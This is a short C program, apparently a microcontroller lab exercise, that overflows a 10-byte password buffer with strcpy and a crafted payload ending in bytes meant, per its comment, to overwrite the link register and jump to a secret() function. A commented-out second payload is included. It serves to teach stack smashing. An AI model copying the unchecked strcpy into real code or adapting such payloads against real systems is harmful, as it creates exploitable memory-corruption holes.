#include "Utils/utils.h"
#include <stdio.h>
#include <string.h>

static void secret(void) {
	printf("Access granted\r\n");
}

int main(void) {
	configClock();
	configUSART2(38400);

	char const *pwd_store = "password";
	char attempt[10];
	
	// Try to overwrite the link register here so that secret() is run
	// even if the password is incorrect
	//strcpy(attempt, "password");
	strcpy(attempt, "AAAAAAAAAAAAAAAAAAAAAA\x31\x24");
	//strcpy(attempt, "AAAAAAAAAA\x10\x2E\0\x08\0\0\0\0\0\0\0\0\x31\x24");
	if (0 == strcmp(attempt, pwd_store)) {
		secret();
	}
}
